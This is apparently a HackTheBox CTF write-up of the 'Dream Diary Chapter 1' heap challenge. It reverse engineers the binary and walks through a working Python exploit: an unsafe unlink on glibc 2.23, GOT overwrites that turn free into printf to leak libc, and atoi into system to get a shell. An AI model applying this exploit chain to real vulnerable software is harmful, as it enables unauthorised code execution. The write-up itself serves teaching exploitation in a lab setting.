---
layout:     post
title:      "HTB Pwn - Dream Diary Chapter: 1"
subtitle:   "Write-Up"
date:       2020-10-19 
author:     "D4mianwayne"
img:       "/img/banner/dream-diary1.png"
tag:      unlink, htb, pwn, heap
category: HackTheBox
---


This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn't get time for this writeup, so I will write it here.

# Attachment

Binary: [Get Here](https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1)
Exploit: [Get Here](https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1.py)

# Initial Analysis

First of, all we will see the binary and the security mechanisms on the binary and see the workflow of it. Let's identify the file:-

```r
0 [05:10:38] vagrant@oracle(oracle) HackTheBox> file chapter1
chapter1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fd205b7bbec91799613399634a187d1ca71e1a3, stripped
```

So, this is a 64 bit binary and on top of that it is stripped, which means reverse engineering it'll take quite sometime, let's check the security mechanisms:-

```r
0 [05:10:41] vagrant@oracle(oracle) HackTheBox> checksec chapter1
[*] '/media/sf_Pwning/HackTheBox/chapter1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`Canary` and `NX Enabled` means that overflow is not gonna happen easily considering **iff** any kind of overflow exists, and it has `Partial RELRO` which `Global Offset Table` would be in `r/w` section which means we can overwrite the GOT entries.

All things, aside let's run the binary:-

```r
2 [05:12:09] vagrant@oracle(oracle) HackTheBox> ./chapter1 

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> 1

Size: 100
Data: AAA
Success!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> 2
Index: 0
Data: AKSSKSK
Done!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> Invalid choice!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> 3
Index: 0
```

So, it seems like it allocates a specific amount of size in memory and then let us store the data at allocated region. On top of that it allow us to delete the allocated region and even edit an allocated chunk. Since we want to pwn it, we need to reverse engineer it, let's go.


# Reverse Engineering

First off, we will load the binary in IDA and let it do the work, then we will analyze the functions. First, we will check the `main` function:-

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  __int64 buf; // [rsp+0h] [rbp-10h]
  unsigned __int64 real_canary; // [rsp+8h] [rbp-8h]

  real_canary = canary;
  buf = 0LL;
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      read(0, &buf, 4uLL);
      v3 = atoi((const char *)&buf);
      if ( v3 != 2 )
        break;
      edit();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        delete();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice!");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      allocate();
    }
  }
}
```

Quite simple, it calls `print_menu` and then read the integer and depending on what option we choose, it calls the function, the only function which stands out for the interest here is `allocate`, `edit` and `delete` as this is the core functions of the binary, let's check those out.

> NOTE: I have named the functions to more readable names, so it'll help in understanding rest of the code.

Let's check the `allocate`:-

```C
unsigned __int64 allocate()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char nptr[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 real_canary; // [rsp+18h] [rbp-8h]

  real_canary = canary;
  *(_QWORD *)nptr = 0LL;
  for ( i = 0; ; ++i )
  {
    if ( i > 15 )
    {
      puts("Too many notes!");
      return canary ^ real_canary;
    }
    if ( !ptr[i] )
      break;
  }
  printf("\nSize: ");
  read_string(nptr, 6uLL);
  size = atoi(nptr);
  ptr[i] = (char *)malloc(size);
  if ( !ptr[i] )
  {
    puts("Malloc error!");
    exit(-1);
  }
  printf("Data: ", 6LL);
  read_string(ptr[i], size);
  puts("Success!");
  return canary ^ real_canary;
}
```

So, first of it checks if the total number of allocated notes is not more than 15, if it is not then it reads the size and then it allocates a chunk of `size` given, with the index of the note stored in the gloabl variable named `ptr`. For example, if none of the note has been allocated and given size is `0x40`, the `allocate `function will do `malloc(0x40)` then it address of the allocated chunk will be stored at `ptr[0] = &allocated_chunk`.

Now, it doesn't do much stuff which seems to be of interest, so let's move on the `delete` function:-

```C
unsigned __int64 delete()
{
  int v1; // [rsp+Ch] [rbp-14h]
  __int64 buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 real_canary; // [rsp+18h] [rbp-8h]

  real_canary = canary;
  buf = 0LL;
  printf("Index: ");
  read(0, &buf, 4uLL);
  v1 = atoi((const char *)&buf);
  if ( v1 >= 0 && v1 <= 15 )
  {
    if ( ptr[v1] )
    {
      free(ptr[v1]);
      ptr[v1] = 0LL;
      puts("Done!");
    }
    else
    {
      puts("No double-free for you!");
    }
  }
  else
  {
    puts("Out of bounds!");
  }
  return canary ^ real_canary;
}
```

It reads the the index of the chunk smartly since it checks for the negative and OOB index and then it checks if there is a chunk which is not NULL'd already, if it's not then it `free`'s the allocated chunk and makes the `ptr[index] = 0` making the UAF out of option. But clearly, it didn't NULL'd the `free`'d region, so maybe it'll be useful later.

Lastly, we will check the `edit` function:-

```C
unsigned __int64 edit()
{
  size_t v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  __int64 buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  buf = 0LL;
  printf("Index: ");
  read(0, &buf, 4uLL);
  v2 = atoi((const char *)&buf);
  if ( v2 >= 0 && v2 <= 15 )
  {
    if ( ptr[v2] )
    {
      v0 = strlen(ptr[v2]);
      printf("Data: ", &buf);
      read_string(ptr[v2], v0);
      puts("Done!");
    }
    else
    {
      puts("No UAF for you!");
    }
  }
  else
  {
    puts("Out of bounds!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

There's something fishy here, first the length for the `read_string` is calculated by `strlen` and then it is reading the data into the allocated memory. So, what is the catch here? To be more subtle, we have to know that `strlen` decided the length of a string when a NULL byte is recognized, for example if we have a string `HELLO\x00`, here it has a NULL Byte in the end, so when `strlen("HELLO\x00")` would be done, the returning value will be 5. but what if the string is not terminated by NULL byte, now since we know that in the `edit` the length for the `read_string`, since the string is not terminated by the NULL byte as we see in the `read_string` below:- 
```C
ssize_t __fastcall read_string(void *a1, size_t a2)
{
  ssize_t result; // rax

  result = read(0, a1, a2);
  if ( (signed int)result <= 0 )
  {
    puts("Read error!");
    exit(-1);
  }
  return result;
}
```

Now, it'll calculate the data only if when the NULL byte will be encountered, there's a off by one(kind of) vulnerability we can use. Without further ado, let's move on.

# Unsafe Unlink

To get along with this, since the given hint was `Xenial Xerus` which is the name of the `Ubuntu 16.04` which uses the LIBC-2.23 which, i back then had many low security checks for the heap internals, taking advantage of one of these loose checks within the `malloc.c`, we will be seeing it soon enough, the technique we will use here would be `Unsafe Unlink`, first of we will see what it is and how we will use it. To be precise, it is used when we have the global pointer address is known, in this case it'd be `ptr`, to understand it more, we will be seeing it in practice in next section, this is more of just an introduction to unlink. So, first of all, we see the following example of the `Unsafe Unlink` from `how2heap` repository:-

> NOTE: This technique is not applicable on fastbin chunks.

```r
0 [16:11:19] vagrant@oracle(oracle) glibc_2.25 (master %)> ./unsafe_unlink 
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x12ee010
The victim chunk we are going to corrupt is at 0x12ee0a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
v
At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

The binary speak for itself, but let's see, first of all we have a global array which contains the pointers to the allocated memory regions stored in the heap. Here, we have the global pointer stored at `0x602070` stored in the BSS region, now according to the example, it is pointing to the `0x12ee010` which is the first allocated chunk, next the victim chunk here is `0x12ee0a0`, when the example says it creates a fake chunk withing the `chunk0` it means we are creating a fake `free`'d chunk, which looks like:-

```r
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk                            |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                         |P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Forward pointer to next chunk in list             |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Back pointer to previous chunk in list            |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Unused space (may be 0 bytes long)                .
	    .                                                               .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

We create a fake chunk where the `fd` pointer points to the `0x602058` and the `bk` pointer points to the `0x602060`, as mentioned the example assumes we have overflow to manipulate the metadata of chunk i.e. `prev_size` and `size` or even `fd` or `bk`, in the example it clears out the `PREV_IN_USE` which is responsible for indicating if the chunk is in use or not by the program in one way or another. So, after that when we free the chunk we clear the `PREV_IN_USE` bit off, since we added a fake in the chunk before that, the heap manager will try to unlink the free'd chunk to make the heap more efficient for the next allocation. In the GLIBC-2.23 has the unlink mechanism as follows:-

```r
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

What we would be doing is the same as backward consolidation, going over this piece of the code we see that the it first checks if the `prev_inuse` is not 0, then it gets the `prev_size` from the chunk header, next it gets the  chunk offset and then calls the `unlink`, let's see the `unlink` snippet.

```r
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");	
```

To be precise, we need to get through the 2 checks to call unlink for our exploit, those checks include:-

* The `prev_size` should not be equal to the size of the next chunk.
* Then the other check is `FD` here is the `fd` address pointed by our chunk and vice versa should point to the chunk itself.

# Exploitation

Theories aside, it's time to go into the exploitation phase, let's create a exploit template to interact with the service:-

```py
from roppy import *

def allocate(size, data):
	p.sendlineafter(">> ", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", data)


def edit(idx, data):
	p.sendlineafter(">> ", "2")
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", data)


def delete(idx):
	p.sendlineafter(">> ", "3")
	p.sendlineafter(": ", str(idx))

def exploit():
    # exploit
  
if __name__ == '__main__':
    p = process("./chapter1")
    elf = ELF("chapter1")
    exploit()
```


So, next up, we will allocate chunks, five chunks would be good, of same size:-

```py
log.info("Created 5 chunks of size: 0x88")
allocate(0x88, "A"*0x88)
allocate(0x88, "B"*0x88)
allocate(0x88, "C"*0x88)
allocate(0x88, "D"*0x88)
allocate(0x88, "E"*0x88)
```

Now, we will run the exploit and see the chunks in gdb:-

```r
0 [08:11:04] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 2417
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88

[..snip..]

gef➤  heap chunks
Chunk(addr=0x1945010, size=0x90, flags=PREV_INUSE)
    [0x0000000001945010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x19450a0, size=0x90, flags=PREV_INUSE)
    [0x00000000019450a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]
Chunk(addr=0x1945130, size=0x90, flags=PREV_INUSE)
    [0x0000000001945130     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]
Chunk(addr=0x19451c0, size=0x90, flags=PREV_INUSE)
    [0x00000000019451c0     44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44    DDDDDDDDDDDDDDDD]
Chunk(addr=0x1945250, size=0x90, flags=PREV_INUSE)
    [0x0000000001945250     45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45    EEEEEEEEEEEEEEEE]
Chunk(addr=0x19452e0, size=0x20d30, flags=PREV_INUSE)  ←  top chunk

gef➤  x/10xg 0x6020c0
0x6020c0:	0x0000000001945010	0x00000000019450a0
0x6020d0:	0x0000000001945130	0x00000000019451c0
0x6020e0:	0x0000000001945250	0x0000000000000000

```

Here, we have 5 chunks on the heap with the size `0x90` and then we have a global array having the pointers of the allocated chunk. Our target is to get control of the `0x6020c0` global array, so that we can manipulate the pointers stored within to it to get r/w primitive.

The plan here is to forge a fake chunk, such that we can point the `fd` and `bk` to the global array, this will be done with:-

```py
log.info("Preparing a fake chunk...")
payload = p64(0x0)*2
payload += p64(global_ptr - 0x18)
payload += p64(global_ptr - 0x10)
payload = payload.ljust(0x80, b"X")
payload += p64(0x80)
payload += b"\x90"
log.info("Fake chunk:\n%s" %(hexdump(payload)))
```

The fake chunk, if seen visually looks like:-

```r
-------------------------------------
|    0                  |     0     |
-------------------------------------
|          global_ptr - 0x18        |
-------------------------------------
|          global_ptr - 0x10        |
-------------------------------------
|                                   |
|              XXXXXXXXXX           |
|                                   |
-------------------------------------
|   0x80         |         0x90     |
------------------------------------
```

Now, running the exploit:-

```r
0 [08:31:09] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 2777
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88
[*] Paused [Press any key to continue]
[*] Preparing a fake chunk...
[*] Fake chunk:
    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000080:  80 00 00 00 00 00 00 00                           |........|
[*] Editing chunk 3 with a fakr chunk

[..snip..]


gef➤  heap chunks
Chunk(addr=0x230a010, size=0x90, flags=PREV_INUSE)
    [0x000000000230a010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x230a0a0, size=0x90, flags=PREV_INUSE)
    [0x000000000230a0a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]
Chunk(addr=0x230a130, size=0x90, flags=PREV_INUSE)
    [0x000000000230a130     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]
Chunk(addr=0x230a1c0, size=0x90, flags=PREV_INUSE)
    [0x000000000230a1c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x230a250, size=0x90, flags=)
    [0x000000000230a250     45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45    EEEEEEEEEEEEEEEE]

gef➤  x/49xg 0x230a1c0 - 0x10
0x230a1b0:	0x4343434343434343	0x0000000000000091
0x230a1c0:	0x0000000000000000	0x0000000000000000
0x230a1d0:	0x00000000006020c0	0x00000000006020c8
0x230a1e0:	0x5858585858585858	0x5858585858585858
0x230a1f0:	0x5858585858585858	0x5858585858585858
0x230a200:	0x5858585858585858	0x5858585858585858
0x230a210:	0x5858585858585858	0x5858585858585858
0x230a220:	0x5858585858585858	0x5858585858585858
0x230a230:	0x5858585858585858	0x5858585858585858
0x230a240:	0x0000000000000080	0x0000000000000090
0x230a250:	0x4545454545454545	0x4545454545454545
0x230a260:	0x4545454545454545	0x4545454545454545
0x230a270:	0x4545454545454545	0x4545454545454545
0x230a280:	0x4545454545454545	0x4545454545454545
0x230a290:	0x4545454545454545	0x4545454545454545
0x230a2a0:	0x4545454545454545	0x4545454545454545
0x230a2b0:	0x4545454545454545	0x4545454545454545
0x230a2c0:	0x4545454545454545	0x4545454545454545
0x230a2d0:	0x4545454545454545	0x0000000000020d31
```

Here, the our forged chunk is within the 3rd chunk, our `fd` points to the `0x6020c0` and the `bk` to the `0x6020c8`, this aside, then we modified the `prev_size` of the chunk `0x230a1c0` to the `0x80` as it was `0x90` before, we did this because, our forged chunk must be considered from the `0x230a1c0` as from the we have an actual free'd chunk structure, then we made `prev_inuse` bit of the chunk `0x230a250` equal to the `0` to consider the chunk as a free'd chunk, so when we try to do `free(chunk4)` it'll consolidate the adjacent chunks, hence doing an unsafe unlink, resulting in the `fd` of the free'd chunk pointing to the `0x6020c0`.

Let's free the chunk 4 and see the memory content to make this more clear.


```r
0 [08:53:07] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 2978
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88
[*] Preparing a fake chunk...
[*] Fake chunk:
    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
[*] Editing chunk 3 with a fakr chunk
[*] Triggering Unlink
[*] Switching to interactive mode
Done!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+

[..snip..]

gef➤  heap chunks
Chunk(addr=0x2236010, size=0x90, flags=PREV_INUSE)
    [0x0000000002236010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x22360a0, size=0x90, flags=PREV_INUSE)
    [0x00000000022360a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]
Chunk(addr=0x2236130, size=0x90, flags=PREV_INUSE)
    [0x0000000002236130     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]
Chunk(addr=0x22361c0, size=0x90, flags=PREV_INUSE)
    [0x00000000022361c0     00 00 00 00 00 00 00 00 41 0e 02 00 00 00 00 00    ........A.......]
gef➤  x/10xg 0x6020c0
0x6020c0:	0x0000000002236010	0x00000000022360a0
0x6020d0:	0x0000000002236130	0x00000000006020c0
```

Now as we see the global array having a pointer to itself on index 3, this means that the chunk 3 is now pointing to the global array itself, let's see what happened under the hood when we did `free(4)`, I will break it down in following steps:-

* There was a forged free'd chunk with the `fd` and `bk` pointing to the global array.
* When the `free(4)` is called and the chunk `4` was initally freed and the forged chunk was coalesced with the chunk `4`.
* Once coalesced, the unlink is triggered resulting in the 3rd chunk pointer in the global array being overwritten with the address we wanted it to.

Now, we have the control over the chunk `3`, we can edit it and get the other pointer overwritten too, if we could overwrite one of the entry with any GOT address, we can get the control over the binary.

```py
log.info("Changing freegot to print@plt for LIBC Leak")
edit(3, p64(elf.got("free")))
edit(0, p64(elf.plt("printf")))
```

So, from the code above you can see, first we overwrite the pointer returned by the chunk `3` which would be the global array itself, then we request for the first chunk via the `edit` function and since the 0th chunk address point to the `free@got`, we get the pointer of `free@GOT` and then it is being overwritten with the `printf@plt`.


```r
0  [13:09:56] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 1985
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88
[*] Preparing a fake chunk...
[*] Fake chunk:
    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
[*] Editing chunk 3 with a fakr chunk
[*] Triggering Unlink
[*] Changing freegot to print@plt for LIBC Leak
[*] Switching to interactive mode
Done!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> Invalid choice!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> $  


[..snip..]
0x0000000000400710  printf@plt
gef➤  got

GOT protection: Partial RelRO | GOT functions: 11
 
[0x602018] free@GLIBC_2.2.5  →  0x400710
```
As you can see, we successfully overwritten the `free@got` with the PLT address of the `printf`. Now, we have the `printf`, as from the reverse engineering, we know that the free is done like `free(ptr[index])`, as the `free` is now `printf`, now it'll do the `printf(ptr(index])`, as obvious it should be we have a format string vulnerability now, we can leak a LIBC address to defeat ASLR.

```py
log.info("Getting __libc_start_main")
allocate(0x88, "%15$p")
delete(4)
p.recvline()
libc_start_main = int(p.recvline().strip(b"\n"), 16)
log.info("__libc_start_main+240:    0x%x" %(libc_start_main))
libc.address = libc_start_main - 240 - libc.function("__libc_start_main")

log.info("LIBC                 :    0x%x" %(libc.address))
```

Running the exploit now, we will have the LIBC leak:-

```py
0 [13:26:50] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 2449
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88
[*] Preparing a fake chunk...
[*] Fake chunk:
    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
[*] Editing chunk 3 with a fakr chunk
[*] Triggering Unlink
[*] Changing freegot to print@plt for LIBC Leak
[*] Getting __libc_start_main
[*] __libc_start_main+240:    0x7f01b54d3840
[*] LIBC                 :    0x7f01b54b3010
[*] Switching to interactive mode
Done!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
```

Now, all left is to calculate the `system` address and then overwrite another GOT entry with the `system` address and enjoy the shell:-

```py
system = p64(libc.function("system"))
#system = system.replace(b"\x7f", b"\x16\x7f")
edit(3, p32(elf.got("atoi")))
edit(0, system)

p.sendafter(">> ", "sh")
p.interactive()
```


Now, running the final exploit:-

```py
0 [13:30:14] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
[+] Starting program './chapter1': PID 2677
[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
[*] Created 5 chunks of size: 0x88
[*] Preparing a fake chunk...
[*] Fake chunk:
    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
[*] Editing chunk 3 with a fakr chunk
[*] Triggering Unlink
[*] Changing freegot to print@plt for LIBC Leak
[*] Getting __libc_start_main
[*] __libc_start_main+240:    0x7f89ceb6c840
[*] LIBC                 :    0x7f89ceb4c010
[*] Switching to interactive mode
Invalid choice!

+------------------------------+
|         Dream Diary          |
+------------------------------+
| [1] Allocate                 |
| [2] Edit                     |
| [3] Delete                   |
| [4] Exit                     |
+------------------------------+
>> $ 
$ whoami
vagrant
$ 
